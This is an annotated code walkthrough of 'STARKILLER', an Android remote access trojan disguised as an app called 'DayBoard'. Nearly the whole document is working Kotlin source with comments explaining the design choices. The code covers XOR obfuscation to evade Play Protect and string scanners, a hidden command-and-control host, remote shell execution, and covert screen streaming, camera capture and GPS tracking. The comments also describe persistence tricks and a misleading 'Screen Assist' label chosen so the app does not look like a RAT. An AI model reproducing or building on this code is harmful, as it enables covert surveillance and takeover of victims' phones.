# STARKILLER — Annotated Code Walkthrough

```
DOCUMENT:     Line-by-Line Code Annotations
OPERATOR:     VADER (george wu / 22DIV)
CLASS:        UNCLASSIFIED // ACADEMIC USE ONLY
COMMIT:       0a84f8c (2026-06-25)
```

Every key file annotated. Not "what it does" — **why** each decision was made.

---

## Table of Contents

1. [Crypt.kt](#1-cryptkt) — XOR obfuscation engine
2. [Config.kt](#2-configkt) — build-time C2 injection
3. [SyncAdapter.kt](#3-syncadapterkt) — VADER protocol framing
4. [Dispatcher.kt](#4-dispatcherkt) — task routing + XOR op codes
5. [SyncService.kt](#5-syncservicekt) — foreground service lifecycle
6. [GrantActivity.kt](#6-grantactivitykt) — MediaProjection consent
7. [AccessService.kt](#7-accessservicekt) — screenshot backend
8. [DisplayHelper.kt](#8-displayhelperkt) — VNC + screenshot engine
9. [LocProvider.kt](#9-locproviderkt) — GPS location
10. [PhotoHelper.kt](#10-photohelperkt) — Camera2 capture

---

## 1. Crypt.kt

XOR+Base64 string obfuscation. All sensitive string literals in Dispatcher.kt are pre-encoded
and decoded at runtime so static string scanners (Play Protect DEX scan, apktool string grep)
never see `"camera"`, `"gps"`, `"register"`, etc. in the compiled bytecode.

```kotlin
object Crypt {
    private const val KEY: Byte = 0x5A
    // KEY = 0x5A (90). Not a password — just shifts the byte range away from
    // printable ASCII. The i%7 rotation prevents identical chars from XORing
    // to the same output (otherwise "aaa" would encode to the same byte 3 times).

    fun d(encoded: String): String {
        val raw = Base64.decode(encoded, Base64.NO_WRAP)
        // NO_WRAP = no line breaks. Android Base64 with WRAP adds newlines every
        // 76 bytes, which breaks decode on compact strings. Always use NO_WRAP
        // for programmatic encode/decode (only use DEFAULT for display).
        val out = ByteArray(raw.size)
        for (i in raw.indices) {
            out[i] = (raw[i].toInt() xor (KEY.toInt() + i % 7)).toByte()
            // XOR each byte with (KEY + position % 7). The rotation makes the
            // key position-dependent — same plaintext char at different positions
            // encodes to different bytes. Frustrates automated pattern matching.
        }
        return String(out, Charsets.UTF_8)
    }

    fun e(plain: String): String {
        // Encode direction — used at build time by obfuscate.py to pre-encode
        // string literals that get hardcoded in Dispatcher.kt source.
        val raw = plain.toByteArray(Charsets.UTF_8)
        val out = ByteArray(raw.size)
        for (i in raw.indices) {
            out[i] = (raw[i].toInt() xor (KEY.toInt() + i % 7)).toByte()
        }
        return Base64.encodeToString(out, Base64.NO_WRAP)
    }
}
```

**Usage in Dispatcher.kt:**
```kotlin
private fun k(e: String) = Crypt.d(e)
// k("KSIvNDA5Dw==") decodes to "sysinfo" at runtime.
// The compiled DEX contains only base64 blobs — grep for "sysinfo" returns nothing.
```

---

## 2. Config.kt

C2 address is never in source control. `build.py` rewrites this file before Gradle compiles.

```kotlin
object Config {
    val SYNC_HOST: String get() = Crypt.d("a2lrc25xUHRq")
    // val not const — can't be inlined by the compiler at call sites.
    // If it were const, the JIT could inline the literal everywhere,
    // making a single build.py replacement insufficient.
    // val with get() = Crypt.d() forces a runtime decode on every access.

    const val SYNC_PORT = 8667
    // Port is plaintext — port numbers aren't sensitive.

    const val RECONNECT_BASE_MS = 5000L
    const val RECONNECT_MAX_MS = 300000L
    // Exponential backoff bounds: 5s initial, 5 minute cap.
    // Prevents hammering a downed C2 (battery drain + behavioral anomaly).

    const val HEARTBEAT_INTERVAL_MS = 30000L
    // 30s heartbeat. Keeps C2 aware of agent liveness and battery.
    // Matches push notification systems (WhatsApp, etc.) — doesn't stand out.

    val APP_NAME: String get() = Crypt.d("HjolHzE+Ej4=")
    // Decodes to "DayBoard". Shown in the persistent foreground notification.

    const val HIDE_ICON = false
    // When true: removes launcher icon after first launch. Disabled in test builds.
}
```

---

## 3. SyncAdapter.kt

VADER protocol: every message is a 4-byte big-endian length prefix followed by the UTF-8 JSON body. All JSON keys for sensitive fields are XOR-encoded via `k()`.

```kotlin
@Synchronized
private fun sendMsg(data: JSONObject) {
    val bytes = data.toString().toByteArray(Charsets.UTF_8)
    val header = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(bytes.size).array()
    // BIG_ENDIAN = standard network byte order. Matches Python's:
    //   struct.pack(">I", len(payload))   # on the C2 side
    //   struct.unpack(">I", header)[0]    # on receive
    output?.write(header)
    output?.write(bytes)
    output?.flush()
    // @Synchronized on the method — multiple Dispatcher threads can call
    // sendResult() simultaneously (camera + VNC tasks can overlap).
    // Without synchronisation, two threads writing to the same OutputStream
    // interleave bytes → corrupted framing on the C2 receiver.
}

private fun recvMsg(): String? {
    val header = ByteArray(4)
    var read = 0
    while (read < 4) {
        val n = input?.read(header, read, 4 - read) ?: return null
        if (n <= 0) return null
        read += n
    }
    // Loop because TCP is a byte stream. A single read() call might return
    // 1, 2, or 3 bytes if the kernel buffer is partially filled.
    // Must accumulate until exactly 4 bytes are read.

    val size = ByteBuffer.wrap(header).order(ByteOrder.BIG_ENDIAN).int
    if (size <= 0 || size > 10_000_000) return null
    // 10MB sanity limit. A malformed 0xFF000000 length field would otherwise
    // allocate 4GB and OOM the process. Protects against corrupted messages.

    val body = ByteArray(size)
    read = 0
    while (read < size) {
        val n = input?.read(body, read, size - read) ?: return null
        if (n <= 0) return null
        read += n
    }
    // Same loop — large messages (VNC frames, file exfil) span many TCP segments.
    return String(body, Charsets.UTF_8)
}
```

---

## 4. Dispatcher.kt

Task router. Receives a JSON task object and calls the correct module. Four-thread pool allows concurrent ops (camera + GPS can run simultaneously).

```kotlin
private val modA by lazy { SysInfo(service) }
private val modB by lazy { PhotoHelper(service) }
// ...
// by lazy = initialised on first access, never again.
// Advantages:
//   1. Service startup is instant (no camera open before first camera task)
//   2. Permission errors surface at task dispatch, not at service start
//   3. A crashing module doesn't prevent other modules from initialising

fun dispatch(task: JSONObject) {
    executor.submit {  // Run on thread pool — never blocks the receive loop
        val op = task.optString(k("NSs="), "")    // k("NSs=") = "op"
        val taskId = task.optString(k("LjovNgE2BA=="), k("LzU3MzEoDg=="))
        // k("LjovNgE2BA==") = "task_id"
        // k("LzU3MzEoDg==") = "unknown_task" (default)

        try {
            val result = when (op) {
                k("KSIvNDA5Dw==") -> modA.collect()   // "sysinfo"
                k("OToxOCw+") -> {                      // "camera"
                    val facing = task.optString(k("PDo/NDA4"), k("KD49Lw=="))
                    // k("PDo/NDA4") = "facing"
                    // k("KD49Lw==") = "back" (default)
                    modB.capture(facing)
                }
                "acc_status" -> JSONObject().apply {
                    // acc_status is NOT encrypted — it's diagnostic-only,
                    // used by the automated test suite and never in production.
                    put("acc_available", AccessService.isAvailable())
                    put("screen_grant", DisplayHelper.isReady())
                    put("last_setup_err", DisplayHelper.lastSetupError)
                    // last_setup_err contains the internal status string from
                    // setupCapture() — lets the test suite diagnose exactly
                    // where projection setup failed.
                }
                "vnc" -> {
                    val interval = task.optInt("interval", 1000)
                    val count = task.optInt("frames", 10)
                    modH.stream(client, taskId, interval, count)
                    // stream() sends N intermediate sendResult() calls (one per frame)
                    // PLUS returns a stream_done JSONObject that dispatch sends as the
                    // final result. The C2's dispatch_vnc() must handle both.
                }
                k("PyM5Pg==") -> {    // "sh"
                    val cmd = task.getString(k("OTQxMD8xBA=="))  // "command"
                    val proc = Runtime.getRuntime().exec(arrayOf(k("KTM="), k("dzg="), cmd))
                    // k("KTM=") = "sh", k("dzg=") = "-c"
                    // exec(String[]) not exec(String) — avoids shell metachar injection.
                    // exec("sh -c " + cmd) would allow a cmd with spaces or quotes to
                    // break the argument parsing. Array form is always safe.
                    val out = proc.inputStream.bufferedReader().readText()
                    val err = proc.errorStream.bufferedReader().readText()
                    proc.waitFor()
                    JSONObject().apply {
                        put(k("KS84Misr"), out)               // "stdout"
                        put(k("KS84OCwt"), err)               // "stderr"
                        put(k("PyM1KQE8Dz4+"), proc.exitValue())  // "exit_code"
                    }
                }
                else -> JSONObject().put(k("PykuMiw="), "unknown op: $op")
                // Catch-all sends an error result. No exception thrown.
                // Unknown ops are handled gracefully — agent stays connected.
            }
            client.sendResult(taskId, result)
        } catch (e: Exception) {
            client.sendResult(taskId, JSONObject().apply {
                put(k("PykuMiw="), e.message ?: "dispatch_exception")  // "error"
                put(k("NSs="), op)  // "op"
            })
            // Catch-all at dispatch level. No module exception propagates to
            // the thread pool's uncaught exception handler. Agent stays alive
            // even if a module crashes.
        }
    }
}
```

---

## 5. SyncService.kt

Foreground service. Owns the TCP connection lifecycle, wake lock, battery optimisation bypass, and MediaProjection activation.

```kotlin
override fun onCreate() {
    super.onCreate()
    handler = Dispatcher(this)
    client = SyncAdapter(this, handler)
    handler.client = client
    acquireWakeLock()
    // PARTIAL_WAKE_LOCK = CPU stays awake, screen can turn off.
    // Without this: Android enters Doze mode when screen is off and the thread
    // pool can be suspended mid-operation (VNC stream drops to 0 fps, GPS
    // times out, camera hangs indefinitely).
    requestBatteryExemption()
    // Launches ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS dialog.
    // User approves once. Without this exemption: Android kills background
    // services after ~60 minutes regardless of foreground status.
    startForegroundNotification()
    // MUST call before any work. Android 8+ gives startForegroundService() callers
    // exactly 5 seconds to call startForeground() or issues an ANR kill.
}

override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
    if (intent?.action == "ACTION_ACTIVATE_MP") {
        // WHY THIS PATTERN:
        // MediaProjection.getMediaProjection(resultCode, data) MUST be called
        // inside a foreground service to survive past the granting Activity's
        // lifecycle. If GrantActivity.finish() runs before getMediaProjection(),
        // the resultCode+data token is invalidated and getMediaProjection() returns null.
        //
        // Solution: GrantActivity sends this intent with the raw token.
        // SyncService is already a running foreground service — it calls
        // getMediaProjection() here, inside the service context.
        val rc = intent.getIntExtra("result_code", 0)
        val data = intent.getParcelableExtra<Intent>("data")
        executor.submit {
            try {
                startForegroundNotification()  // Re-assert with MEDIA_PROJECTION type.
                // Android 12+ requires FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                // to be declared before calling getMediaProjection() in a service.
                val proj = mpm.getMediaProjection(rc, data!!)
                if (proj != null) {
                    DisplayHelper.setupCapture(proj, metrics)
                }
            } catch (e: Exception) {
                DisplayHelper.lastSetupError = "svc_ex: ${e.javaClass.simpleName}: ${e.message}"
            }
        }
        return START_NOT_STICKY
        // START_NOT_STICKY for the setup intent — don't re-deliver if service restarts.
        // The projection token is one-time-use; redelivering would fail.
    }
    if (!running) {
        running = true
        executor.submit { connectionLoop() }
    }
    return START_STICKY
    // START_STICKY = if OS kills service, restart with null intent.
    // connectionLoop() handles reconnection automatically on restart.
}

private fun connectionLoop() {
    while (running) {
        try {
            client.connect()             // Blocks until connected or throws
            reconnectDelay = Config.RECONNECT_BASE_MS  // Reset backoff on success
            startHeartbeat()
            client.receiveLoop()         // Blocks until disconnection or throws
        } catch (_: Exception) {}        // Any exception → fall through to reconnect

        client.disconnect()
        if (!running) break
        Thread.sleep(reconnectDelay)
        reconnectDelay = min(reconnectDelay * 2, Config.RECONNECT_MAX_MS)
        // Backoff: 5s → 10s → 20s → 40s → ... → 300s (5 min cap)
    }
}

private fun startForegroundNotification() {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
        startForeground(1, notification,
            ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
            ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
        // Two types are needed:
        // DATA_SYNC  = allows network operations in background (TCP connection)
        // MEDIA_PROJECTION = required for getMediaProjection() on Android 12+
        //                    throws SecurityException if this type isn't declared
    }
}
```

---

## 6. GrantActivity.kt

Handles the one-time screen recording consent dialog. Owns the resultCode+data token, immediately transfers it to SyncService.

```kotlin
override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    startActivityForResult(mpm.createScreenCaptureIntent(), 1001)
    // createScreenCaptureIntent() = system dialog "DayBoard wants to record your screen."
    // There is no way to bypass this dialog — it's an OS-enforced requirement.
    // The app label "Screen Assist" (from AccessService's label in the manifest)
    // makes it look like a system accessibility feature rather than a RAT.
}

override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
    if (requestCode == 1001 && resultCode == RESULT_OK && data != null) {
        val activate = Intent(this, SyncService::class.java).apply {
            action = "ACTION_ACTIVATE_MP"
            putExtra("result_code", resultCode)
            putExtra("data", data)
            // WHY PASS TO SERVICE INSTEAD OF CALLING getMediaProjection() HERE:
            // If we called mpm.getMediaProjection(resultCode, data) inside this
            // Activity, the returned MediaProjection object would be bound to the
            // Activity's Context. When finish() runs, Android can GC both the
            // Activity and the associated projection, killing VNC mid-stream.
            // By passing the raw token to SyncService, the projection is created
            // inside the service context and lives until the service is destroyed.
            putExtra("width", getDisplayWidth())   // Pass display dimensions
            putExtra("height", getDisplayHeight())  // so setupCapture() can use them
            putExtra("dpi", resources.displayMetrics.densityDpi)
        }
        startService(activate)  // Not startForegroundService — SyncService is already running
    }
    finish()  // Token transferred — Activity can die now
}
```

**Why RESULT_CANCELED historically broke things:**
Samsung Galaxy S10e returns RESULT_CANCELED for targetSdk > 31 even when the user taps "Start now". The fix is `targetSdk 31` in build.gradle.kts — keeps Samsung's MediaProjection compatibility mode active.

---

## 7. AccessService.kt

Android 12+ AccessibilityService screenshot path. Faster than MediaProjection (no VirtualDisplay setup), no user consent dialog needed. Samsung One UI 4 deliberately breaks it.

```kotlin
@Volatile var instance: AccessService? = null
// @Volatile = JVM memory visibility guarantee across threads.
// onServiceConnected() runs on the main thread; captureFrame() is called from
// Dispatcher thread pool. Without @Volatile, a Dispatcher thread could see
// a stale null after the service has connected (CPU register caching).
// @Volatile forces a memory fence: every read sees the latest write.

fun captureFrame(quality: Int = 60, scale: Int = 2): ByteArray? {
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) return null
    // takeScreenshot() is API 31+ only. Return null on older Android.

    try {
        svc.takeScreenshot(Display.DEFAULT_DISPLAY, svc.mainExecutor,
            object : TakeScreenshotCallback {
                override fun onSuccess(screenshot: ScreenshotResult) {
                    try {
                        val buf = screenshot.hardwareBuffer
                        // HardwareBuffer = GPU-backed buffer.
                        // CANNOT be JPEG-compressed directly — it's in GPU memory.
                        // Must copy to a CPU-backed software bitmap first.
                        val hwBmp = Bitmap.wrapHardwareBuffer(buf, screenshot.colorSpace)
                        buf.close()
                        // MUST close HardwareBuffer immediately after wrapping.
                        // It holds a native GPU resource. Not closing it leaks
                        // GPU memory — eventually crashes the device graphics stack.

                        val soft = hwBmp!!.copy(Bitmap.Config.ARGB_8888, false)
                        hwBmp.recycle()
                        // ARGB_8888 = 4 bytes per pixel, software-backed, compressible.

                        val scaled = Bitmap.createScaledBitmap(
                            soft, soft.width / scale, soft.height / scale, true)
                        soft.recycle()
                        // scale=2 reduces 3040x1440 → 1520x720 before JPEG.
                        // Full-res at 60% JPEG quality ≈ 400KB per frame.
                        // Half-res ≈ 100KB per frame — much better for TCP streaming.

                        val baos = ByteArrayOutputStream()
                        scaled.compress(Bitmap.CompressFormat.JPEG, quality, baos)
                        scaled.recycle()
                        result = baos.toByteArray()
                    } finally {
                        latch.countDown()
                        // ALWAYS countDown in finally. If compression throws,
                        // without finally the latch.await(4s) would always
                        // timeout and captureFrame() would always return null.
                    }
                }
                override fun onFailure(errorCode: Int) { latch.countDown() }
            })
    } catch (_: Exception) { return null }
    // SAMSUNG FIX: Samsung One UI 4 strips CAPABILITY_CAN_TAKE_SCREENSHOT
    // from third-party AccessibilityServices at runtime, even when the XML
    // declares canTakeScreenshot="true". It throws RuntimeException directly
    // from takeScreenshot() — NOT via onFailure(). Catching all exceptions
    // and returning null triggers the MediaProjection fallback path.

    latch.await(4, TimeUnit.SECONDS)
    return result
    // null return on: API < 31, Samsung exception, onFailure(), 4s timeout.
    // Callers (DisplayHelper.capture(), DisplayHelper.stream()) check for null.
}
```

---

## 8. DisplayHelper.kt

The most complex module. Manages the VirtualDisplay pipeline, frame cache, and streaming. Two paths: accessibility (fast) → MediaProjection fallback (robust).

```kotlin
companion object {
    // All fields in companion object (static equivalent) because DisplayHelper
    // instances are created per-task dispatch. VirtualDisplay must persist
    // across calls — if it were an instance field, every new DisplayHelper
    // would have null virtDisplay.

    @Volatile var projection: MediaProjection? = null
    // Written by SyncService (ACTION_ACTIVATE_MP handler thread).
    // Read by Dispatcher tasks (multiple threads). @Volatile required.

    private val frameQ = LinkedBlockingQueue<ByteArray>(3)
    // Capacity=3. If the consumer is slow (1s VNC interval), producer
    // doesn't accumulate unbounded frames. offer() returns false if full —
    // we ignore that (we want the latest frame, not old ones).

    @Volatile private var lastFrame: ByteArray? = null
    // SAMSUNG VD LAZY-PUSH FIX:
    // VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR only pushes a new frame when screen
    // content changes. A static home screen → no frames in frameQ.
    // Solution: cache the last received frame. If frameQ.poll(2s) returns null,
    // return lastFrame instead. This guarantees a frame is always available
    // once the VirtualDisplay is set up, even on a static screen.

    var lastSetupError: String = ""
    // Updated at each stage of setupCapture(). Exposed via acc_status op.
    // Lets the test suite diagnose failures without reading logcat.

    @Synchronized
    fun setupCapture(proj: MediaProjection, metrics: DisplayMetrics) {
        lastSetupError = ""
        teardown()
        // Clean up existing VirtualDisplay before creating a new one.
        // Without teardown(): calling setupCapture() twice leaks a
        // HandlerThread and an ImageReader (native resource leak).

        val w = metrics.widthPixels / 2
        val h = metrics.heightPixels / 2
        // Half-resolution capture. Full Samsung Galaxy display = 1080x2340.
        // At half-res: 540x1170. JPEG 60% ≈ 60-80KB per frame vs 300KB full-res.

        val reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
        // maxImages=2 = double buffering. Enough to avoid dropped frames
        // without holding excess GPU buffers.

        reader.setOnImageAvailableListener({ r ->
            if (!capturing) {
                r.acquireLatestImage()?.close()
                return@setOnImageAvailableListener
            }
            // Discard frames when not actively capturing. This prevents frameQ
            // filling with stale frames between VNC frame intervals.

            val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val ps = planes[0].pixelStride
                val rs = planes[0].rowStride
                val bmpW = rs / ps
                // SAMSUNG ROW ALIGNMENT:
                // Samsung hardware pads image rows to alignment boundaries.
                // rowStride > pixelStride * actualWidth on Samsung devices.
                // Creating bitmap at rowStride/pixelStride width then cropping
                // gives the correct pixel data without distortion.

                val bytes = ByteArrayOutputStream().also {
                    crop.compress(Bitmap.CompressFormat.JPEG, 60, it)
                }.toByteArray()

                lastFrame = bytes   // Update cache BEFORE offer() so it's always
                                    // consistent with the latest content.
                frameQ.offer(bytes) // Non-blocking. If queue is full, drop silently.
            } finally {
                img.close()
                // MUST close every Image. ImageReader has a fixed slot count (maxImages=2).
                // If both slots are occupied and we don't close, acquireLatestImage()
                // returns null permanently — VNC stops working silently.
            }
        }, h2)

        val vd = proj.createVirtualDisplay(
            "sk_vd", w, h, dpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            reader.surface, null, h2)
        // VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR = mirror the real display.
        // Without this, the VirtualDisplay is blank (good for remote desktop
        // use cases where you don't want to show what you're doing — not ours).

        // ... null check on vd ...

        projection = proj
        // CRITICAL: teardown() at the top of this function sets projection=null.
        // We must re-assign here after the VirtualDisplay is successfully created.
        // Without this line: isReady() always returns false.
        // This was the root cause of "grant_required" responses on every second call.
    }

    fun isReady() = projection != null && virtDisplay != null
    // Both must be non-null. projection alone doesn't guarantee the VirtualDisplay
    // was created successfully (createVirtualDisplay() can return null).
}

fun stream(client: SyncAdapter, taskId: String, intervalMs: Int, frameCount: Int): JSONObject {
    val useAcc = AccessService.isAvailable() && Build.VERSION.SDK_INT >= S
    if (!useAcc && !isReady()) return JSONObject().put("error", "grant_required")

    var accFailed = false

    for (i in 0 until frameCount) {
        var bytes: ByteArray? = null

        if (useAcc && !accFailed) {
            bytes = AccessService.captureFrame()
            if (bytes == null) accFailed = true
            // On Samsung: captureFrame() returns null on the FIRST call.
            // accFailed=true. We don't skip frame i — fall through to MP path below.
            // This ensures frame i is still sent via MediaProjection (5/5 not 4/5).
        }

        if (bytes == null) {
            if (!isReady()) break
            frameQ.clear()  // Discard stale frames from before this capture window.
            capturing = true
            bytes = frameQ.poll(2, TimeUnit.SECONDS) ?: lastFrame
            // poll(2s): wait up to 2 seconds for the ImageReader callback.
            // ?: lastFrame: Samsung lazy-push fallback. If screen didn't change
            // since last frame, ImageReader pushes nothing — use cached last frame.
            capturing = false
        }

        if (bytes != null) {
            client.sendResult(taskId, JSONObject().apply {
                put("frame", i)
                put("total", frameCount)
                // The "frame" key is what dispatch_vnc.py on the C2 checks to
                // distinguish per-frame results from the final stream_done result.
                // stream_done has NO "frame" key. The break condition is:
                //   if "frame" not in data: break  (this is the stream_done signal)
                put("source", if (useAcc && !accFailed) "accessibility" else "mediaprojection")
                put(k("PjooPA=="), Base64.encodeToString(bytes, Base64.NO_WRAP))
                put(k("KTImOA=="), bytes.size)
            })
            sent++
        }

        if (i < frameCount - 1) Thread.sleep(intervalMs.toLong())
        // Sleep BETWEEN frames, not after the last one. A 5-frame 500ms stream
        // should take 2000ms (4 intervals), not 2500ms (5 intervals).
    }

    return JSONObject().apply {
        put(k("KS89KSss"), "stream_done")   // k("KS89KSss") = "status"
        put("frames_sent", sent)
        put("frames_requested", frameCount)
        // NO "frame" key — this is what dispatch_vnc.py uses to detect stream_done.
    }
}
```

---

## 9. LocProvider.kt

GPS with fast-path / slow-path strategy. LastKnown is instant; live acquisition blocks up to 15s.

```kotlin
fun getLocation(): JSONObject {
    val last = lm.getLastKnownLocation(GPS_PROVIDER)
        ?: lm.getLastKnownLocation(NETWORK_PROVIDER)
    if (last != null) return locationToJson(last)
    // Fast path: OS caches GPS fixes from any app that has requested location.
    // Returns immediately. Coordinates might be hours old but usually sufficient.
    // GPS_PROVIDER tried first (more accurate), then NETWORK_PROVIDER (cell/WiFi).

    // Slow path: request a live fix
    val latch = CountDownLatch(1)
    var result: Location? = null

    val listener = object : LocationListener {
        override fun onLocationChanged(location: Location) {
            result = location
            latch.countDown()
            lm.removeUpdates(this)
            // Immediately deregister. "Single update" means one fix.
            // Without removeUpdates(), the listener fires repeatedly
            // (every ~1s for GPS) wasting battery after we have our fix.
        }
    }

    lm.requestSingleUpdate(GPS_PROVIDER, listener, Looper.getMainLooper())
    // LOOPER FIX: This method requires the calling thread to have a Looper
    // (Android message queue) to deliver the callback.
    // Dispatcher threads (ExecutorService) have NO Looper by default.
    // Without Looper.getMainLooper():
    //   RuntimeException: Can't create handler inside thread that has not called Looper.prepare()
    // Passing Looper.getMainLooper() routes the callback through the main thread's
    // message queue. Safe: onLocationChanged() only writes result + countDownLatch.

    latch.await(15, TimeUnit.SECONDS)
    lm.removeUpdates(listener)  // Cleanup even if timeout fired before callback
    return if (result != null) locationToJson(result!!)
           else JSONObject().put("error", "location timeout")
}
```

---

## 10. PhotoHelper.kt

Camera2 API. The older Camera API is deprecated since API 21. Camera2 provides direct hardware control.

```kotlin
fun capture(facing: String): JSONObject {
    val cameraId = cm.cameraIdList.firstOrNull { id ->
        val chars = cm.getCameraCharacteristics(id)
        chars.get(LENS_FACING) == targetFacing
    }
    // getCameraCharacteristics() requires no permission.
    // We can probe all cameras to find front/back without CAMERA permission.
    // Permission only required on openCamera().

    val reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)
    // 640x480 for test build. Production: use highest supported resolution
    // from StreamConfigurationMap.getOutputSizes(ImageFormat.JPEG).
    // maxImages=1: single shot — no need for double buffering.

    reader.setOnImageAvailableListener({ r ->
        val image = r.acquireLatestImage()
        if (image != null) {
            val buffer = image.planes[0].buffer
            // JPEG ImageReader: exactly ONE plane containing the full JPEG bytes.
            // Contrast with RGBA_8888: four planes (R, G, B, A) each with separate stride.
            // No processing needed — the hardware JPEG encoder handles compression.
            imageData = ByteArray(buffer.remaining())
            buffer.get(imageData!!)
            image.close()   // Release ImageReader slot
            latch.countDown()
        }
    }, handler)

    cm.openCamera(cameraId, object : CameraDevice.StateCallback() {
        override fun onOpened(camera: CameraDevice) {
            camera.createCaptureSession(listOf(reader.surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        val req = camera.createCaptureRequest(TEMPLATE_STILL_CAPTURE)
                        // TEMPLATE_STILL_CAPTURE: optimised for image quality.
                        // Enables full auto-exposure, autofocus, AWB convergence.
                        // Contrast with TEMPLATE_PREVIEW (lower latency, lower quality).
                        req.addTarget(reader.surface)
                        session.capture(req.build(), object : CaptureCallback() {}, handler)
                        // Single capture — fires once, then the session is done.
                        // No need for setRepeatingRequest().
                    }
                }, handler)
        }
        override fun onDisconnected(camera: CameraDevice) { camera.close(); latch.countDown() }
        override fun onError(camera: CameraDevice, error: Int) { camera.close(); latch.countDown() }
    }, handler)

    latch.await(10, TimeUnit.SECONDS)
    thread.quitSafely()
    // quitSafely() = drain pending messages then quit.
    // quit() would discard in-flight callbacks. If the ImageReader callback
    // hasn't fired yet when we quitSafely(), it completes before the thread exits.
}
```

---

## Key Design Patterns

### CountDownLatch everywhere

All hardware modules (camera, GPS, screenshot, audio) are async callback APIs. Dispatcher runs on a thread pool and needs synchronous results. `CountDownLatch(1)` + `latch.await(timeout)` is the standard bridge. The pattern is identical in GPS, Camera2, and AccessService.

### @Volatile on shared companion fields

SyncService writes `DisplayHelper.projection` from the ACTION_ACTIVATE_MP handler thread. Dispatcher tasks read it via `isReady()`. Without `@Volatile`, the JVM can cache the value in a CPU register — a write on thread A isn't guaranteed to be visible to thread B without a memory fence. `@Volatile` forces the fence on every read and write.

### Lazy module initialisation

All Dispatcher modules use `by lazy`. This means:
1. Service starts instantly (no camera, GPS, or microphone opened at boot)
2. Permission failures surface at task time with a clean error result
3. One crashing module doesn't break others

### VADER framing (4-byte length prefix)

TCP is a byte stream — segments can be fragmented or coalesced. A JSON boundary-less stream would corrupt on packet fragmentation. The 4-byte big-endian length prefix allows exact reassembly. All loops read until exactly N bytes are accumulated (never assume one `read()` call returns N bytes).

### Samsung One UI 4 workarounds

Samsung's modifications to Android 12 break three standard APIs:
1. **ADB accessibility grant**: Requires UI confirmation via uiautomator
2. **`takeScreenshot()`**: Capability stripped at runtime → catch RuntimeException, return null
3. **VirtualDisplay frame push**: Lazy-push on static screens → `lastFrame` cache + `frameQ.poll(2s) ?: lastFrame`

All three workarounds are in the test suite (`test_auto.py`) and the Kotlin modules. None require rooting or special permissions.

---

*Every decision has a reason. Every reason is documented.*
